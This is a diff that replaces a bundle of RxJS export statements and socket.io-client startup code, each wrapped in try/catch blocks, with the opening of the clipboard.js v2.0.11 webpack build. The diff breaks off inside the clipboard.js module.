-Object.defineProperty(exports, "Subscriber", { enumerable: true, get: function () { return Subscriber_1.Subscriber; } });
-var Notification_1 = require("./internal/Notification");
-Object.defineProperty(exports, "Notification", { enumerable: true, get: function () { return Notification_1.Notification; } });
-Object.defineProperty(exports, "NotificationKind", { enumerable: true, get: function () { return Notification_1.NotificationKind; } });
-var pipe_1 = require("./internal/util/pipe");
-Object.defineProperty(exports, "pipe", { enumerable: true, get: function () { return pipe_1.pipe; } });
-var noop_1 = require("./internal/util/noop");
-Object.defineProperty(exports, "noop", { enumerable: true, get: function () { return noop_1.noop; } });
-var identity_1 = require("./internal/util/identity");
-Object.defineProperty(exports, "identity", { enumerable: true, get: function () { return identity_1.identity; } });
-var isObservable_1 = require("./internal/util/isObservable");
-Object.defineProperty(exports, "isObservable", { enumerable: true, get: function () { return isObservable_1.isObservable; } });
-var lastValueFrom_1 = require("./internal/lastValueFrom");
-Object.defineProperty(exports, "lastValueFrom", { enumerable: true, get: function () { return lastValueFrom_1.lastValueFrom; } });
-var firstValueFrom_1 = require("./internal/firstValueFrom");
-Object.defineProperty(exports, "firstValueFrom", { enumerable: true, get: function () { return firstValueFrom_1.firstValueFrom; } });
-var ArgumentOutOfRangeError_1 = require("./internal/util/ArgumentOutOfRangeError");
-Object.defineProperty(exports, "ArgumentOutOfRangeError", { enumerable: true, get: function () { return ArgumentOutOfRangeError_1.ArgumentOutOfRangeError; } });
-var EmptyError_1 = require("./internal/util/EmptyError");
-Object.defineProperty(exports, "EmptyError", { enumerable: true, get: function () { return EmptyError_1.EmptyError; } });
-var NotFoundError_1 = require("./internal/util/NotFoundError");
-Object.defineProperty(exports, "NotFoundError", { enumerable: true, get: function () { return NotFoundError_1.NotFoundError; } });
-var ObjectUnsubscribedError_1 = require("./internal/util/ObjectUnsubscribedError");
-Object.defineProperty(exports, "ObjectUnsubscribedError", { enumerable: true, get: function () { return ObjectUnsubscribedError_1.ObjectUnsubscribedError; } });
-var SequenceError_1 = require("./internal/util/SequenceError");
-Object.defineProperty(exports, "SequenceError", { enumerable: true, get: function () { return SequenceError_1.SequenceError; } });
-var timeout_1 = require("./internal/operators/timeout");
-Object.defineProperty(exports, "TimeoutError", { enumerable: true, get: function () { return timeout_1.TimeoutError; } });
-var UnsubscriptionError_1 = require("./internal/util/UnsubscriptionError");
-Object.defineProperty(exports, "UnsubscriptionError", { enumerable: true, get: function () { return UnsubscriptionError_1.UnsubscriptionError; } });
-var bindCallback_1 = require("./internal/observable/bindCallback");
-Object.defineProperty(exports, "bindCallback", { enumerable: true, get: function () { return bindCallback_1.bindCallback; } });
-var bindNodeCallback_1 = require("./internal/observable/bindNodeCallback");
-Object.defineProperty(exports, "bindNodeCallback", { enumerable: true, get: function () { return bindNodeCallback_1.bindNodeCallback; } });
-var combineLatest_1 = require("./internal/observable/combineLatest");
-Object.defineProperty(exports, "combineLatest", { enumerable: true, get: function () { return combineLatest_1.combineLatest; } });
-var concat_1 = require("./internal/observable/concat");
-Object.defineProperty(exports, "concat", { enumerable: true, get: function () { return concat_1.concat; } });
-var connectable_1 = require("./internal/observable/connectable");
-Object.defineProperty(exports, "connectable", { enumerable: true, get: function () { return connectable_1.connectable; } });
-var defer_1 = require("./internal/observable/defer");
-Object.defineProperty(exports, "defer", { enumerable: true, get: function () { return defer_1.defer; } });
-var empty_1 = require("./internal/observable/empty");
-Object.defineProperty(exports, "empty", { enumerable: true, get: function () { return empty_1.empty; } });
-var forkJoin_1 = require("./internal/observable/forkJoin");
-Object.defineProperty(exports, "forkJoin", { enumerable: true, get: function () { return forkJoin_1.forkJoin; } });
-var from_1 = require("./internal/observable/from");
-Object.defineProperty(exports, "from", { enumerable: true, get: function () { return from_1.from; } });
-var fromEvent_1 = require("./internal/observable/fromEvent");
-Object.defineProperty(exports, "fromEvent", { enumerable: true, get: function () { return fromEvent_1.fromEvent; } });
-var fromEventPattern_1 = require("./internal/observable/fromEventPattern");
-Object.defineProperty(exports, "fromEventPattern", { enumerable: true, get: function () { return fromEventPattern_1.fromEventPattern; } });
-var generate_1 = require("./internal/observable/generate");
-Object.defineProperty(exports, "generate", { enumerable: true, get: function () { return generate_1.generate; } });
-var iif_1 = require("./internal/observable/iif");
-Object.defineProperty(exports, "iif", { enumerable: true, get: function () { return iif_1.iif; } });
-var interval_1 = require("./internal/observable/interval");
-Object.defineProperty(exports, "interval", { enumerable: true, get: function () { return interval_1.interval; } });
-var merge_1 = require("./internal/observable/merge");
-Object.defineProperty(exports, "merge", { enumerable: true, get: function () { return merge_1.merge; } });
-var never_1 = require("./internal/observable/never");
-Object.defineProperty(exports, "never", { enumerable: true, get: function () { return never_1.never; } });
-var of_1 = require("./internal/observable/of");
-Object.defineProperty(exports, "of", { enumerable: true, get: function () { return of_1.of; } });
-var onErrorResumeNext_1 = require("./internal/observable/onErrorResumeNext");
-Object.defineProperty(exports, "onErrorResumeNext", { enumerable: true, get: function () { return onErrorResumeNext_1.onErrorResumeNext; } });
-var pairs_1 = require("./internal/observable/pairs");
-Object.defineProperty(exports, "pairs", { enumerable: true, get: function () { return pairs_1.pairs; } });
-var partition_1 = require("./internal/observable/partition");
-Object.defineProperty(exports, "partition", { enumerable: true, get: function () { return partition_1.partition; } });
-var race_1 = require("./internal/observable/race");
-Object.defineProperty(exports, "race", { enumerable: true, get: function () { return race_1.race; } });
-var range_1 = require("./internal/observable/range");
-Object.defineProperty(exports, "range", { enumerable: true, get: function () { return range_1.range; } });
-var throwError_1 = require("./internal/observable/throwError");
-Object.defineProperty(exports, "throwError", { enumerable: true, get: function () { return throwError_1.throwError; } });
-var timer_1 = require("./internal/observable/timer");
-Object.defineProperty(exports, "timer", { enumerable: true, get: function () { return timer_1.timer; } });
-var using_1 = require("./internal/observable/using");
-Object.defineProperty(exports, "using", { enumerable: true, get: function () { return using_1.using; } });
-var zip_1 = require("./internal/observable/zip");
-Object.defineProperty(exports, "zip", { enumerable: true, get: function () { return zip_1.zip; } });
-var scheduled_1 = require("./internal/scheduled/scheduled");
-Object.defineProperty(exports, "scheduled", { enumerable: true, get: function () { return scheduled_1.scheduled; } });
-var empty_2 = require("./internal/observable/empty");
-Object.defineProperty(exports, "EMPTY", { enumerable: true, get: function () { return empty_2.EMPTY; } });
-var never_2 = require("./internal/observable/never");
-Object.defineProperty(exports, "NEVER", { enumerable: true, get: function () { return never_2.NEVER; } });
-__exportStar(require("./internal/types"), exports);
-var config_1 = require("./internal/config");
-Object.defineProperty(exports, "config", { enumerable: true, get: function () { return config_1.config; } });
-var audit_1 = require("./internal/operators/audit");
-Object.defineProperty(exports, "audit", { enumerable: true, get: function () { return audit_1.audit; } });
-var auditTime_1 = require("./internal/operators/auditTime");
-Object.defineProperty(exports, "auditTime", { enumerable: true, get: function () { return auditTime_1.auditTime; } });
-var buffer_1 = require("./internal/operators/buffer");
-Object.defineProperty(exports, "buffer", { enumerable: true, get: function () { return buffer_1.buffer; } });
-var bufferCount_1 = require("./internal/operators/bufferCount");
-Object.defineProperty(exports, "bufferCount", { enumerable: true, get: function () { return bufferCount_1.bufferCount; } });
-var bufferTime_1 = require("./internal/operators/bufferTime");
-Object.defineProperty(exports, "bufferTime", { enumerable: true, get: function () { return bufferTime_1.bufferTime; } });
-var bufferToggle_1 = require("./internal/operators/bufferToggle");
-Object.defineProperty(exports, "bufferToggle", { enumerable: true, get: function () { return bufferToggle_1.bufferToggle; } });
-var bufferWhen_1 = require("./internal/operators/bufferWhen");
-Object.defineProperty(exports, "bufferWhen", { enumerable: true, get: function () { return bufferWhen_1.bufferWhen; } });
-var catchError_1 = require("./internal/operators/catchError");
-Object.defineProperty(exports, "catchError", { enumerable: true, get: function () { return catchError_1.catchError; } });
-var combineAll_1 = require("./internal/operators/combineAll");
-Object.defineProperty(exports, "combineAll", { enumerable: true, get: function () { return combineAll_1.combineAll; } });
-var combineLatestAll_1 = require("./internal/operators/combineLatestAll");
-Object.defineProperty(exports, "combineLatestAll", { enumerable: true, get: function () { return combineLatestAll_1.combineLatestAll; } });
-var combineLatestWith_1 = require("./internal/operators/combineLatestWith");
-Object.defineProperty(exports, "combineLatestWith", { enumerable: true, get: function () { return combineLatestWith_1.combineLatestWith; } });
-var concatAll_1 = require("./internal/operators/concatAll");
-Object.defineProperty(exports, "concatAll", { enumerable: true, get: function () { return concatAll_1.concatAll; } });
-var concatMap_1 = require("./internal/operators/concatMap");
-Object.defineProperty(exports, "concatMap", { enumerable: true, get: function () { return concatMap_1.concatMap; } });
-var concatMapTo_1 = require("./internal/operators/concatMapTo");
-Object.defineProperty(exports, "concatMapTo", { enumerable: true, get: function () { return concatMapTo_1.concatMapTo; } });
-var concatWith_1 = require("./internal/operators/concatWith");
-Object.defineProperty(exports, "concatWith", { enumerable: true, get: function () { return concatWith_1.concatWith; } });
-var connect_1 = require("./internal/operators/connect");
-Object.defineProperty(exports, "connect", { enumerable: true, get: function () { return connect_1.connect; } });
-var count_1 = require("./internal/operators/count");
-Object.defineProperty(exports, "count", { enumerable: true, get: function () { return count_1.count; } });
-var debounce_1 = require("./internal/operators/debounce");
-Object.defineProperty(exports, "debounce", { enumerable: true, get: function () { return debounce_1.debounce; } });
-var debounceTime_1 = require("./internal/operators/debounceTime");
-Object.defineProperty(exports, "debounceTime", { enumerable: true, get: function () { return debounceTime_1.debounceTime; } });
-var defaultIfEmpty_1 = require("./internal/operators/defaultIfEmpty");
-Object.defineProperty(exports, "defaultIfEmpty", { enumerable: true, get: function () { return defaultIfEmpty_1.defaultIfEmpty; } });
-var delay_1 = require("./internal/operators/delay");
-Object.defineProperty(exports, "delay", { enumerable: true, get: function () { return delay_1.delay; } });
-var delayWhen_1 = require("./internal/operators/delayWhen");
-Object.defineProperty(exports, "delayWhen", { enumerable: true, get: function () { return delayWhen_1.delayWhen; } });
-var dematerialize_1 = require("./internal/operators/dematerialize");
-Object.defineProperty(exports, "dematerialize", { enumerable: true, get: function () { return dematerialize_1.dematerialize; } });
-var distinct_1 = require("./internal/operators/distinct");
-Object.defineProperty(exports, "distinct", { enumerable: true, get: function () { return distinct_1.distinct; } });
-var distinctUntilChanged_1 = require("./internal/operators/distinctUntilChanged");
-Object.defineProperty(exports, "distinctUntilChanged", { enumerable: true, get: function () { return distinctUntilChanged_1.distinctUntilChanged; } });
-var distinctUntilKeyChanged_1 = require("./internal/operators/distinctUntilKeyChanged");
-Object.defineProperty(exports, "distinctUntilKeyChanged", { enumerable: true, get: function () { return distinctUntilKeyChanged_1.distinctUntilKeyChanged; } });
-var elementAt_1 = require("./internal/operators/elementAt");
-Object.defineProperty(exports, "elementAt", { enumerable: true, get: function () { return elementAt_1.elementAt; } });
-var endWith_1 = require("./internal/operators/endWith");
-Object.defineProperty(exports, "endWith", { enumerable: true, get: function () { return endWith_1.endWith; } });
-var every_1 = require("./internal/operators/every");
-Object.defineProperty(exports, "every", { enumerable: true, get: function () { return every_1.every; } });
-var exhaust_1 = require("./internal/operators/exhaust");
-Object.defineProperty(exports, "exhaust", { enumerable: true, get: function () { return exhaust_1.exhaust; } });
-var exhaustAll_1 = require("./internal/operators/exhaustAll");
-Object.defineProperty(exports, "exhaustAll", { enumerable: true, get: function () { return exhaustAll_1.exhaustAll; } });
-var exhaustMap_1 = require("./internal/operators/exhaustMap");
-Object.defineProperty(exports, "exhaustMap", { enumerable: true, get: function () { return exhaustMap_1.exhaustMap; } });
-var expand_1 = require("./internal/operators/expand");
-Object.defineProperty(exports, "expand", { enumerable: true, get: function () { return expand_1.expand; } });
-var filter_1 = require("./internal/operators/filter");
-Object.defineProperty(exports, "filter", { enumerable: true, get: function () { return filter_1.filter; } });
-var finalize_1 = require("./internal/operators/finalize");
-Object.defineProperty(exports, "finalize", { enumerable: true, get: function () { return finalize_1.finalize; } });
-var find_1 = require("./internal/operators/find");
-Object.defineProperty(exports, "find", { enumerable: true, get: function () { return find_1.find; } });
-var findIndex_1 = require("./internal/operators/findIndex");
-Object.defineProperty(exports, "findIndex", { enumerable: true, get: function () { return findIndex_1.findIndex; } });
-var first_1 = require("./internal/operators/first");
-Object.defineProperty(exports, "first", { enumerable: true, get: function () { return first_1.first; } });
-var groupBy_1 = require("./internal/operators/groupBy");
-Object.defineProperty(exports, "groupBy", { enumerable: true, get: function () { return groupBy_1.groupBy; } });
-var ignoreElements_1 = require("./internal/operators/ignoreElements");
-Object.defineProperty(exports, "ignoreElements", { enumerable: true, get: function () { return ignoreElements_1.ignoreElements; } });
-var isEmpty_1 = require("./internal/operators/isEmpty");
-Object.defineProperty(exports, "isEmpty", { enumerable: true, get: function () { return isEmpty_1.isEmpty; } });
-var last_1 = require("./internal/operators/last");
-Object.defineProperty(exports, "last", { enumerable: true, get: function () { return last_1.last; } });
-var map_1 = require("./internal/operators/map");
-Object.defineProperty(exports, "map", { enumerable: true, get: function () { return map_1.map; } });
-var mapTo_1 = require("./internal/operators/mapTo");
-Object.defineProperty(exports, "mapTo", { enumerable: true, get: function () { return mapTo_1.mapTo; } });
-var materialize_1 = require("./internal/operators/materialize");
-Object.defineProperty(exports, "materialize", { enumerable: true, get: function () { return materialize_1.materialize; } });
-var max_1 = require("./internal/operators/max");
-Object.defineProperty(exports, "max", { enumerable: true, get: function () { return max_1.max; } });
-var mergeAll_1 = require("./internal/operators/mergeAll");
-Object.defineProperty(exports, "mergeAll", { enumerable: true, get: function () { return mergeAll_1.mergeAll; } });
-var flatMap_1 = require("./internal/operators/flatMap");
-Object.defineProperty(exports, "flatMap", { enumerable: true, get: function () { return flatMap_1.flatMap; } });
-var mergeMap_1 = require("./internal/operators/mergeMap");
-Object.defineProperty(exports, "mergeMap", { enumerable: true, get: function () { return mergeMap_1.mergeMap; } });
-var mergeMapTo_1 = require("./internal/operators/mergeMapTo");
-Object.defineProperty(exports, "mergeMapTo", { enumerable: true, get: function () { return mergeMapTo_1.mergeMapTo; } });
-var mergeScan_1 = require("./internal/operators/mergeScan");
-Object.defineProperty(exports, "mergeScan", { enumerable: true, get: function () { return mergeScan_1.mergeScan; } });
-var mergeWith_1 = require("./internal/operators/mergeWith");
-Object.defineProperty(exports, "mergeWith", { enumerable: true, get: function () { return mergeWith_1.mergeWith; } });
-var min_1 = require("./internal/operators/min");
-Object.defineProperty(exports, "min", { enumerable: true, get: function () { return min_1.min; } });
-var multicast_1 = require("./internal/operators/multicast");
-Object.defineProperty(exports, "multicast", { enumerable: true, get: function () { return multicast_1.multicast; } });
-var observeOn_1 = require("./internal/operators/observeOn");
-Object.defineProperty(exports, "observeOn", { enumerable: true, get: function () { return observeOn_1.observeOn; } });
-var onErrorResumeNextWith_1 = require("./internal/operators/onErrorResumeNextWith");
-Object.defineProperty(exports, "onErrorResumeNextWith", { enumerable: true, get: function () { return onErrorResumeNextWith_1.onErrorResumeNextWith; } });
-var pairwise_1 = require("./internal/operators/pairwise");
-Object.defineProperty(exports, "pairwise", { enumerable: true, get: function () { return pairwise_1.pairwise; } });
-var pluck_1 = require("./internal/operators/pluck");
-Object.defineProperty(exports, "pluck", { enumerable: true, get: function () { return pluck_1.pluck; } });
-var publish_1 = require("./internal/operators/publish");
-Object.defineProperty(exports, "publish", { enumerable: true, get: function () { return publish_1.publish; } });
-var publishBehavior_1 = require("./internal/operators/publishBehavior");
-Object.defineProperty(exports, "publishBehavior", { enumerable: true, get: function () { return publishBehavior_1.publishBehavior; } });
-var publishLast_1 = require("./internal/operators/publishLast");
-Object.defineProperty(exports, "publishLast", { enumerable: true, get: function () { return publishLast_1.publishLast; } });
-var publishReplay_1 = require("./internal/operators/publishReplay");
-Object.defineProperty(exports, "publishReplay", { enumerable: true, get: function () { return publishReplay_1.publishReplay; } });
-var raceWith_1 = require("./internal/operators/raceWith");
-Object.defineProperty(exports, "raceWith", { enumerable: true, get: function () { return raceWith_1.raceWith; } });
-var reduce_1 = require("./internal/operators/reduce");
-Object.defineProperty(exports, "reduce", { enumerable: true, get: function () { return reduce_1.reduce; } });
-var repeat_1 = require("./internal/operators/repeat");
-Object.defineProperty(exports, "repeat", { enumerable: true, get: function () { return repeat_1.repeat; } });
-var repeatWhen_1 = require("./internal/operators/repeatWhen");
-Object.defineProperty(exports, "repeatWhen", { enumerable: true, get: function () { return repeatWhen_1.repeatWhen; } });
-var retry_1 = require("./internal/operators/retry");
-Object.defineProperty(exports, "retry", { enumerable: true, get: function () { return retry_1.retry; } });
-var retryWhen_1 = require("./internal/operators/retryWhen");
-Object.defineProperty(exports, "retryWhen", { enumerable: true, get: function () { return retryWhen_1.retryWhen; } });
-var refCount_1 = require("./internal/operators/refCount");
-Object.defineProperty(exports, "refCount", { enumerable: true, get: function () { return refCount_1.refCount; } });
-var sample_1 = require("./internal/operators/sample");
-Object.defineProperty(exports, "sample", { enumerable: true, get: function () { return sample_1.sample; } });
-var sampleTime_1 = require("./internal/operators/sampleTime");
-Object.defineProperty(exports, "sampleTime", { enumerable: true, get: function () { return sampleTime_1.sampleTime; } });
-var scan_1 = require("./internal/operators/scan");
-Object.defineProperty(exports, "scan", { enumerable: true, get: function () { return scan_1.scan; } });
-var sequenceEqual_1 = require("./internal/operators/sequenceEqual");
-Object.defineProperty(exports, "sequenceEqual", { enumerable: true, get: function () { return sequenceEqual_1.sequenceEqual; } });
-var share_1 = require("./internal/operators/share");
-Object.defineProperty(exports, "share", { enumerable: true, get: function () { return share_1.share; } });
-var shareReplay_1 = require("./internal/operators/shareReplay");
-Object.defineProperty(exports, "shareReplay", { enumerable: true, get: function () { return shareReplay_1.shareReplay; } });
-var single_1 = require("./internal/operators/single");
-Object.defineProperty(exports, "single", { enumerable: true, get: function () { return single_1.single; } });
-var skip_1 = require("./internal/operators/skip");
-Object.defineProperty(exports, "skip", { enumerable: true, get: function () { return skip_1.skip; } });
-var skipLast_1 = require("./internal/operators/skipLast");
-Object.defineProperty(exports, "skipLast", { enumerable: true, get: function () { return skipLast_1.skipLast; } });
-var skipUntil_1 = require("./internal/operators/skipUntil");
-Object.defineProperty(exports, "skipUntil", { enumerable: true, get: function () { return skipUntil_1.skipUntil; } });
-var skipWhile_1 = require("./internal/operators/skipWhile");
-Object.defineProperty(exports, "skipWhile", { enumerable: true, get: function () { return skipWhile_1.skipWhile; } });
-var startWith_1 = require("./internal/operators/startWith");
-Object.defineProperty(exports, "startWith", { enumerable: true, get: function () { return startWith_1.startWith; } });
-var subscribeOn_1 = require("./internal/operators/subscribeOn");
-Object.defineProperty(exports, "subscribeOn", { enumerable: true, get: function () { return subscribeOn_1.subscribeOn; } });
-var switchAll_1 = require("./internal/operators/switchAll");
-Object.defineProperty(exports, "switchAll", { enumerable: true, get: function () { return switchAll_1.switchAll; } });
-var switchMap_1 = require("./internal/operators/switchMap");
-Object.defineProperty(exports, "switchMap", { enumerable: true, get: function () { return switchMap_1.switchMap; } });
-var switchMapTo_1 = require("./internal/operators/switchMapTo");
-Object.defineProperty(exports, "switchMapTo", { enumerable: true, get: function () { return switchMapTo_1.switchMapTo; } });
-var switchScan_1 = require("./internal/operators/switchScan");
-Object.defineProperty(exports, "switchScan", { enumerable: true, get: function () { return switchScan_1.switchScan; } });
-var take_1 = require("./internal/operators/take");
-Object.defineProperty(exports, "take", { enumerable: true, get: function () { return take_1.take; } });
-var takeLast_1 = require("./internal/operators/takeLast");
-Object.defineProperty(exports, "takeLast", { enumerable: true, get: function () { return takeLast_1.takeLast; } });
-var takeUntil_1 = require("./internal/operators/takeUntil");
-Object.defineProperty(exports, "takeUntil", { enumerable: true, get: function () { return takeUntil_1.takeUntil; } });
-var takeWhile_1 = require("./internal/operators/takeWhile");
-Object.defineProperty(exports, "takeWhile", { enumerable: true, get: function () { return takeWhile_1.takeWhile; } });
-var tap_1 = require("./internal/operators/tap");
-Object.defineProperty(exports, "tap", { enumerable: true, get: function () { return tap_1.tap; } });
-var throttle_1 = require("./internal/operators/throttle");
-Object.defineProperty(exports, "throttle", { enumerable: true, get: function () { return throttle_1.throttle; } });
-var throttleTime_1 = require("./internal/operators/throttleTime");
-Object.defineProperty(exports, "throttleTime", { enumerable: true, get: function () { return throttleTime_1.throttleTime; } });
-var throwIfEmpty_1 = require("./internal/operators/throwIfEmpty");
-Object.defineProperty(exports, "throwIfEmpty", { enumerable: true, get: function () { return throwIfEmpty_1.throwIfEmpty; } });
-var timeInterval_1 = require("./internal/operators/timeInterval");
-Object.defineProperty(exports, "timeInterval", { enumerable: true, get: function () { return timeInterval_1.timeInterval; } });
-var timeout_2 = require("./internal/operators/timeout");
-Object.defineProperty(exports, "timeout", { enumerable: true, get: function () { return timeout_2.timeout; } });
-var timeoutWith_1 = require("./internal/operators/timeoutWith");
-Object.defineProperty(exports, "timeoutWith", { enumerable: true, get: function () { return timeoutWith_1.timeoutWith; } });
-var timestamp_1 = require("./internal/operators/timestamp");
-Object.defineProperty(exports, "timestamp", { enumerable: true, get: function () { return timestamp_1.timestamp; } });
-var toArray_1 = require("./internal/operators/toArray");
-Object.defineProperty(exports, "toArray", { enumerable: true, get: function () { return toArray_1.toArray; } });
-var window_1 = require("./internal/operators/window");
-Object.defineProperty(exports, "window", { enumerable: true, get: function () { return window_1.window; } });
-var windowCount_1 = require("./internal/operators/windowCount");
-Object.defineProperty(exports, "windowCount", { enumerable: true, get: function () { return windowCount_1.windowCount; } });
-var windowTime_1 = require("./internal/operators/windowTime");
-Object.defineProperty(exports, "windowTime", { enumerable: true, get: function () { return windowTime_1.windowTime; } });
-var windowToggle_1 = require("./internal/operators/windowToggle");
-Object.defineProperty(exports, "windowToggle", { enumerable: true, get: function () { return windowToggle_1.windowToggle; } });
-var windowWhen_1 = require("./internal/operators/windowWhen");
-Object.defineProperty(exports, "windowWhen", { enumerable: true, get: function () { return windowWhen_1.windowWhen; } });
-var withLatestFrom_1 = require("./internal/operators/withLatestFrom");
-Object.defineProperty(exports, "withLatestFrom", { enumerable: true, get: function () { return withLatestFrom_1.withLatestFrom; } });
-var zipAll_1 = require("./internal/operators/zipAll");
-Object.defineProperty(exports, "zipAll", { enumerable: true, get: function () { return zipAll_1.zipAll; } });
-var zipWith_1 = require("./internal/operators/zipWith");
-Object.defineProperty(exports, "zipWith", { enumerable: true, get: function () { return zipWith_1.zipWith; } });
-//# sourceMappingURL=index.js.map
-}catch(e){}
-})();
-
-/* >>> socket.io-client (3296 bytes) <<< */
-(function(){
-try{
-"use strict";
-var __importDefault = (this && this.__importDefault) || function (mod) {
-    return (mod && mod.__esModule) ? mod : { "default": mod };
-};
-Object.defineProperty(exports, "__esModule", { value: true });
-exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
-exports.io = lookup;
-exports.connect = lookup;
-exports.default = lookup;
-const url_js_1 = require("./url.js");
-const manager_js_1 = require("./manager.js");
-Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
-const socket_js_1 = require("./socket.js");
-Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
-const debug_1 = __importDefault(require("debug")); // debug()
-const debug = (0, debug_1.default)("socket.io-client"); // debug()
-/**
- * Managers cache.
+/*!
+ * clipboard.js v2.0.11
+ * https://clipboardjs.com/
+ *
+ * Licensed MIT © Zeno Rocha
  */
-const cache = {};
-function lookup(uri, opts) {
-    if (typeof uri === "object") {
-        opts = uri;
-        uri = undefined;
+(function webpackUniversalModuleDefinition(root, factory) {
+	if(typeof exports === 'object' && typeof module === 'object')
+		module.exports = factory();
+	else if(typeof define === 'function' && define.amd)
+		define([], factory);
+	else if(typeof exports === 'object')
+		exports["ClipboardJS"] = factory();
+	else
+		root["ClipboardJS"] = factory();
+})(this, function() {
+return /******/ (function() { // webpackBootstrap
+/******/ 	var __webpack_modules__ = ({
+
+/***/ 686:
+/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {
+
+"use strict";
+
+// EXPORTS
+__webpack_require__.d(__webpack_exports__, {
+  "default": function() { return /* binding */ clipboard; }
+});
+
+// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
+var tiny_emitter = __webpack_require__(279);
+var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
+// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
+var listen = __webpack_require__(370);
+var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
+// EXTERNAL MODULE: ./node_modules/select/src/select.js
+var src_select = __webpack_require__(817);
+var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
+;// CONCATENATED MODULE: ./src/common/command.js
+/**
+ * Executes a given operation type.
+ * @param {String} type
+ * @return {Boolean}
+ */
+function command(type) {
+  try {
+    return document.execCommand(type);
+  } catch (err) {
+    return false;
+  }
+}
+;// CONCATENATED MODULE: ./src/actions/cut.js
+
+
+/**
+ * Cut action wrapper.
+ * @param {String|HTMLElement} target
+ * @return {String}
+ */
+
+var ClipboardActionCut = function ClipboardActionCut(target) {
+  var selectedText = select_default()(target);
+  command('cut');
+  return selectedText;
+};
+
+/* harmony default export */ var actions_cut = (ClipboardActionCut);
+;// CONCATENATED MODULE: ./src/common/create-fake-element.js
+/**
+ * Creates a fake textarea element with a value.
+ * @param {String} value
+ * @return {HTMLElement}
+ */
+function createFakeElement(value) {
+  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
+  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS
+
+  fakeElement.style.fontSize = '12pt'; // Reset box model
+
+  fakeElement.style.border = '0';
+  fakeElement.style.padding = '0';
+  fakeElement.style.margin = '0'; // Move element out of screen horizontally
+
+  fakeElement.style.position = 'absolute';
+  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically
+
+  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+  fakeElement.style.top = "".concat(yPosition, "px");
+  fakeElement.setAttribute('readonly', '');
+  fakeElement.value = value;
+  return fakeElement;
+}
+;// CONCATENATED MODULE: ./src/actions/copy.js
+
+
+
+/**
+ * Create fake copy action wrapper using a fake element.
+ * @param {String} target
+ * @param {Object} options
+ * @return {String}
+ */
+
+var fakeCopyAction = function fakeCopyAction(value, options) {
+  var fakeElement = createFakeElement(value);
+  options.container.appendChild(fakeElement);
+  var selectedText = select_default()(fakeElement);
+  command('copy');
+  fakeElement.remove();
+  return selectedText;
+};
+/**
+ * Copy action wrapper.
+ * @param {String|HTMLElement} target
+ * @param {Object} options
+ * @return {String}
+ */
+
+
+var ClipboardActionCopy = function ClipboardActionCopy(target) {
+  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
+    container: document.body
+  };
+  var selectedText = '';
+
+  if (typeof target === 'string') {
+    selectedText = fakeCopyAction(target, options);
+  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
+    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
+    selectedText = fakeCopyAction(target.value, options);
+  } else {
+    selectedText = select_default()(target);
+    command('copy');
+  }
+
+  return selectedText;
+};
+
+/* harmony default export */ var actions_copy = (ClipboardActionCopy);
+;// CONCATENATED MODULE: ./src/actions/default.js
+function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }
+
+
+
+/**
+ * Inner function which performs selection from either `text` or `target`
+ * properties and then executes copy or cut operations.
+ * @param {Object} options
+ */
+
+var ClipboardActionDefault = function ClipboardActionDefault() {
+  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
+  // Defines base properties passed from constructor.
+  var _options$action = options.action,
+      action = _options$action === void 0 ? 'copy' : _options$action,
+      container = options.container,
+      target = options.target,
+      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.
+
+  if (action !== 'copy' && action !== 'cut') {
+    throw new Error('Invalid "action" value, use either "copy" or "cut"');
+  } // Sets the `target` property using an element that will be have its content copied.
+
+
+  if (target !== undefined) {
+    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
+      if (action === 'copy' && target.hasAttribute('disabled')) {
+        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
+      }
+
+      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
+        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
+      }
+    } else {
+      throw new Error('Invalid "target" value, use a valid Element');
     }
-    opts = opts || {};
-    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
-    const source = parsed.source;
-    const id = parsed.id;
-    const path = parsed.path;
-    const sameNamespace = cache[id] && path in cache[id]["nsps"];
-    const newConnection = opts.forceNew ||
-        opts["force new connection"] ||
-        false === opts.multiplex ||
-        sameNamespace;
-    let io;
-    if (newConnection) {
-        debug("ignoring socket cache for %s", source);
-        io = new manager_js_1.Manager(source, opts);
+  } // Define selection strategy based on `text` property.
+
+
+  if (text) {
+    return actions_copy(text, {
+      container: container
+    });
+  } // Defines which selection strategy based on `target` property.
+
+
+  if (target) {
+    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
+      container: container
+    });
+  }
+};
+
+/* harmony default export */ var actions_default = (ClipboardActionDefault);
+;// CONCATENATED MODULE: ./src/clipboard.js
